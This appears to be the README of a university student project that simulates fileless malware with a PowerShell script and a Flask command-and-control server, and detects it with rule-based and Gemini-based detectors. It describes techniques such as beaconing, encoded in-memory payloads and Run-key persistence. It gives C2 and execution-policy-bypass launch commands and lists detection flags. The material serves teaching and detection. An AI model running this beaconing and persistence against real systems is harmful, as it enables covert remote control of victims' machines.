IT 359 Final Project — Spring 2026
Fileless Malware: Attack Simulation & Detection
This project explores fileless malware — a category of malware that operates entirely within a computer's RAM, writing nothing to disk. Because traditional antivirus solutions rely on file-based signature scanning, fileless malware evades them effectively. This project gives hands-on experience with both offensive (Red Team) and defensive (Blue Team) techniques.
---
Team: Hack the Blocks
Member	Role
Zac Davis	Red Team / Simulation
Caleb Clauson	Blue Team / Detection
---
Project Structure
```
├── docs/
│   ├── project_overview.md
│   └── setup_guide.md
├── src/
│   ├── red_team/
│   │   ├── fileless_simulation.ps1   # PowerShell malware simulation
│   │   └── c2_listener.py            # Python C2 server (Flask)
│   └── blue_team/
│       ├── detector.py               # Rule-based behavioral detector
│       └── ml_detector.py            # AI/ML-based detector (Gemini API)
├── .env
├── .gitignore
├── example-ai-api-usage.js
├── README.md
└── requirements.txt
```
---
Red Team Components
1. Fileless Malware Simulation (`fileless_simulation.ps1`)
A PowerShell script that simulates common fileless malware techniques. It supports two modes:
Demo Mode (default): Logs and explains each action without modifying the system.
Live Mode: Executes the techniques on the system for realistic detection testing.
Technique	Description
In-Memory Reconnaissance	Gathers hostname, username, OS, IP, and admin status entirely in RAM — nothing written to disk
HTTP Beaconing	Registers with the C2 server, then sends periodic heartbeats; receives and executes commands
In-Memory Code Execution	Compiles and runs a `ScriptBlock` dynamically from a string — no file ever touches disk
Environment Variable Abuse	Encodes a payload in Base64, stores it in a process-level environment variable, and decodes/executes it
Registry Persistence	Demonstrates writing a Run key entry that would re-execute on user logon (Demo: shown but not written; Live: written)
WMI Event Subscription	Explains WMI-based persistence — triggered on system events with no files required (concept only, not executed)
Process Hollowing	Describes how attackers replace a legitimate process's memory with malicious code (concept only, not executed)
Usage:
```powershell
# Demo mode (default — no system changes)
.\fileless_simulation.ps1

# Live mode — executes techniques on the system
.\fileless_simulation.ps1 -LiveMode

# Specify C2 server
.\fileless_simulation.ps1 -LiveMode -C2Server "192.168.1.100" -C2Port 8080

# Undo live changes (registry key, marker files)
.\fileless_simulation.ps1 -Undo -LiveMode
```
2. Command & Control Listener (`c2_listener.py`)
A Flask-based HTTP server that acts as the attacker's C2 infrastructure. It:
Receives and stores initial reconnaissance data from the simulation
Accepts periodic heartbeat beacons and tracks session state
Queues commands (manually or automatically) to dispatch to connected sessions
Exposes a REST API for session inspection and command injection
Endpoints:
Method	Endpoint	Description
GET	`/`	Health check
POST	`/register`	Initial registration from the simulation
POST	`/heartbeat`	Periodic beacon; returns queued command if any
GET	`/sessions`	Lists all known sessions
GET/POST	`/commands/<session_id>`	View or queue commands for a session
Usage:
```bash
python src/red_team/c2_listener.py
python src/red_team/c2_listener.py --host 0.0.0.0 --port 8080 --verbose
```
---
Blue Team Components
1. Rule-Based Behavioral Detector (`detector.py`)
Detects fileless malware activity by monitoring running processes and network connections — no file scanning involved. Key detection methods:
Suspicious PowerShell command lines: Flags use of `-EncodedCommand`, `-WindowStyle Hidden`, `Invoke-Expression`, etc.
C2 connection detection: Monitors for PowerShell processes establishing connections to the configured C2 host/port
Beaconing detection: Identifies repeated, periodic connection patterns consistent with beacon loops
Behavior scoring: Combines multiple weak signals (PowerShell process + outbound network + suspicious flags) into a composite risk score
Registry persistence detection: Watches the HKCU `Run` key for the demo persistence entry
Artifact file detection: Flags marker files created in Live mode (`C:\temp\execution_marker.txt`, `Desktop\HI.txt`)
Packet capture (optional): Uses Scapy + Npcap to inspect HTTP response bodies and extract C2 commands in real time
Usage:
```bash
# Basic — watch any IP on port 8080
python src/blue_team/detector.py

# Point at a specific C2 server
python src/blue_team/detector.py --c2-host 192.168.1.100 --c2-port 8080

# Enable debug output and packet capture
python src/blue_team/detector.py --debug --pcap-iface "Loopback Pseudo-Interface 1"
```
Npcap (Required for packet capture):
Packet capture (used to intercept C2 HTTP responses) requires Npcap to be installed on Windows. Without it, the detector still works using process and network polling, but the real-time command extraction feature will be disabled.
Download and install Npcap from https://npcap.com/
During installation, check "Install Npcap in WinPcap API-compatible mode" if prompted
Run the detector with administrator privileges to allow packet capture
If Npcap is not installed, the detector prints a warning and continues without packet capture
2. AI/ML-Based Detector (`ml_detector.py`)
Uses the Google Gemini API (model: `gemma-4-26b-a4b-it`) to classify process behavior as benign, suspicious, or malicious. Rather than relying on hard-coded rules, the detector:
Collects a snapshot of running processes via `psutil`
Applies lightweight local heuristics to score each process (command-line flags, network activity, beacon-like timing)
For processes that exceed the local score threshold, sends a structured feature payload to the Gemini model
Parses the model's JSON response (`verdict`, `confidence`, `reasons`) and logs or prints alerts
Writes structured JSONL logs suitable for ingestion into SIEM tools (Splunk, ELK, etc.)
Gemini model used: `gemma-4-26b-a4b-it`
This model is accessed via the `google-genai` Python client. The API key is read from the `GEMINI_API_KEY` environment variable (see Setup below).
Key behaviors:
Throttles repeat AI calls per process to avoid API overuse
Detects beacon-like timing (periodic connection patterns) without hardcoding a C2 IP
Filters out common noisy processes (browsers, system services) to reduce false positives
Supports environment variable tuning (polling interval, score thresholds, verbosity)
Usage:
```bash
python src/blue_team/ml_detector.py
```
Environment variable tuning (optional):
Variable	Default	Description
`ML_DETECTOR_POLL_SECONDS`	`1`	How often to scan processes
`ML_DETECTOR_MIN_SCORE`	`2`	Minimum local score to escalate to AI
`ML_DETECTOR_THROTTLE_SECONDS`	`15`	Minimum time between AI calls for the same process
`ML_DETECTOR_AI_VERBOSE`	`false`	Print full features and raw model output
`ML_DETECTOR_WRITE_ALERT_LOG`	`false`	Write suspicious/malicious verdicts to a log file
`ML_DETECTOR_DEBUG`	`false`	Enable verbose debug output
---
Technologies Used
Category	Technologies
Red Team	PowerShell 5.1+, Python 3.8+, Flask
Blue Team	Python 3.8+, psutil, Scapy
Packet Capture	Scapy, Npcap (Windows)
AI / ML	Google Gemini API (`gemma-4-26b-a4b-it`) via `google-genai`
Communication	HTTP, Flask
---
Setup & Installation
Prerequisites
Windows 10/11 (PowerShell simulation requires Windows)
Python 3.8 or higher
Npcap (optional — required only for packet capture in `detector.py`)
A Google Gemini API key (required for `ml_detector.py`)
Quick Start
```bash
# Clone the repository
git clone https://github.com/zcdvs/new-repo-it359.git
cd new-repo-it359

# Create and activate a Python virtual environment
python -m venv venv

# macOS / Linux
source venv/bin/activate

# Windows (PowerShell)
.\venv\Scripts\Activate.ps1

# Windows (cmd.exe)
.\venv\Scripts\activate.bat

# Install dependencies
pip install -r requirements.txt
```
Setting the `GEMINI_API_KEY` Environment Variable
`ml_detector.py` requires a Gemini API key. Set it using one of the methods below.
PowerShell (temporary — current session only):
```powershell
$env:GEMINI_API_KEY = "YOUR_API_KEY_HERE"
```
PowerShell (persistent — new sessions required after setting):
```powershell
setx GEMINI_API_KEY "YOUR_API_KEY_HERE"
```
Command Prompt (temporary):
```cmd
set GEMINI_API_KEY=YOUR_API_KEY_HERE
```
macOS / Linux (temporary):
```bash
export GEMINI_API_KEY="YOUR_API_KEY_HERE"
```
macOS / Linux (persistent — add to shell profile):
```bash
echo 'export GEMINI_API_KEY="YOUR_API_KEY_HERE"' >> ~/.bashrc
source ~/.bashrc
```
`.env` file (local development):
Create a `.env` file in the repository root:
```
GEMINI_API_KEY=YOUR_API_KEY_HERE
```
Then load it with your preferred dotenv tool, or source it manually before running the detector.
Running the Lab
A full lab run uses three terminal windows:
Terminal 1 — Start the C2 listener (attacker machine or VM):
```bash
python src/red_team/c2_listener.py --host 0.0.0.0 --port 8080 --verbose
```
Terminal 2 — Start the detector (victim machine, run as Administrator):
```bash
python src/blue_team/detector.py --c2-host <C2_IP> --c2-port 8080 --debug
# or for the ML detector:
python src/blue_team/ml_detector.py
```
Terminal 3 — Run the simulation (victim machine):
```bash
# Demo mode (no system changes)
powershell -ExecutionPolicy Bypass -File src/red_team/fileless_simulation.ps1 -C2Server <C2_IP>

# Live mode (executes techniques)
powershell -ExecutionPolicy Bypass -File src/red_team/fileless_simulation.ps1 -LiveMode -C2Server <C2_IP>
```
---
⚠️ Disclaimer
This project is for EDUCATIONAL PURPOSES ONLY.
Only run these scripts in isolated, controlled lab environments
Never use on systems or networks without explicit written authorization
This project is part of an academic course (IT 359) at Illinois State University
The authors are not responsible for any misuse of the code or techniques demonstrated
---
License
This project was created for academic purposes as part of IT 359 at Illinois State University, Spring 2026.
